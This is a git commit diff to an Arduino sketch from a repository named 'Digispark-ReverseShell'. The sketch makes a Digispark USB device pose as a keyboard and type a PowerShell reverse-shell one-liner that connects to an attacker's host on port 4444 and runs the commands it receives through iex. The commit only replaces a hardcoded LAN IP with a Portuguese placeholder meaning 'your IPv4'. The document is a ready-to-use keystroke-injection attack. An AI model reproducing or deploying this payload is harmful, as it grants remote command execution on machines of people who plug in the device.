be0b20a4633cafebd6864f91b2066b966b7f8f60
root rod <124756053+rootrod7@users.noreply.github.com>
2023-08-10 11:29:56 -0300

    Update sketch_aug10a.ino

--- Digispark-ReverseShell/sketch_aug10a/sketch_aug10a.ino
+++ Digispark-ReverseShell/sketch_aug10a/sketch_aug10a.ino
@@ -11,6 +11,6 @@ void loop() {
   DigiKeyboardPtBr.delay(1000);
   DigiKeyboardPtBr.println(mode);
   DigiKeyboardPtBr.delay(5000);
-  DigiKeyboardPtBr.println("$sm=(New-Object Net.Sockets.TCPClient(\"192.168.15.18\",4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}");
+  DigiKeyboardPtBr.println("$sm=(New-Object Net.Sockets.TCPClient(\"SEU IPV4\",4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}");
 
 }
